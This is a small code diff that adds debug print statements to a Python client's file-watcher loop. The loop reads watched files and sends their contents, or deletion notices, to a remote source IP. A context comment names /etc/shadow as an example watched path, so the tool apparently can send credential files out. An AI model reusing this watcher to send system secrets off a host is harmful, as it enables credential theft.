@@ -441,6 +441,7 @@ class Client:
                                     # Use canonical path for atomic-rename workflows (e.g. /etc/shadow)
                                     src = os.path.join(watch_path, target_file) if target_file else full_path
                                     try:
+                                        print(f"{event_name} detected for {filename}\n")
                                         with open(src, 'rb') as f:
                                             filedata = f.read()
                                         send_name = target_file or filename
@@ -455,6 +456,7 @@ class Client:
                                     # Double-check target_file match inside event loop
                                     if target_file and filename != target_file:
                                         continue
+                                    print(f"{event_name} detected for {filename}")
                                     send_name = target_file or filename
                                     self.send_response(src_ip, CommandType.FILE_DELETE,
                                                        send_name.encode('utf-8'))
@@ -462,6 +464,7 @@ class Client:
 
                                 elif event_name in ('IN_DELETE_SELF', 'IN_MOVE_SELF'):
                                     print(f"Watcher: watched path was deleted or moved, stopping.")
+                                    print(f"{event_name} detected for {filename}")
                                     self._watcher_stop.set()
                                     break
 
